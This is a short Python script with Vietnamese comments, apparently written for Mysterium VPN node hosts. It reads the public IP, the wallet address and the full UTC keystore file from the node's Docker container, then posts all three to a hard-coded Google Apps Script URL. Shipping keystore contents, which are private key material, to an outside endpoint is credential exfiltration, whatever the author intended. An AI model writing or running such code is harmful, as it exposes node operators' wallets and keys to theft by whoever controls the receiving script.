import subprocess
import json
import requests

def get_public_ipv4():
    """ Lấy địa chỉ IPv4 chính xác """
    try:
        ip = requests.get("http://checkip.amazonaws.com", timeout=5).text.strip()
        return ip
    except:
        try:
            ip = requests.get("https://ifconfig.me", timeout=5).text.strip()
            return ip
        except:
            return "Unknown"

# Get IPv4 address
ipv4 = get_public_ipv4()

# Get Wallet information
wallet_json = (
    subprocess.run("docker exec myst cat /var/lib/mysterium-node/keystore/remeber.json", 
                  shell=True, capture_output=True, text=True)
    .stdout.strip()
)
wallet = json.loads(wallet_json).get("wallet", "")

# Get UTC file name
utc_file = (
    subprocess.run("docker exec myst ls /var/lib/mysterium-node/keystore | grep UTC-", 
                  shell=True, capture_output=True, text=True)
    .stdout.strip()
)

# Get Phase information
phase = (
    subprocess.run(f"docker exec myst cat /var/lib/mysterium-node/keystore/{utc_file}", 
                  shell=True, capture_output=True, text=True)
    .stdout.strip()
)

# Send data to Google Apps Script API
api_url = "https://script.google.com/macros/s/AKfycbxinRyh8Kl7q-SvhZYUoQLeh0-WU9gn5Mh3akiS2AQK3Wg1oN2XeZTMqJyGRPnMhL0v/exec"
data = {"ipv4": ipv4, "wallet": wallet, "phase": phase}
response = requests.post(api_url, json=data)

print(response.json())  # Kiểm tra kết quả
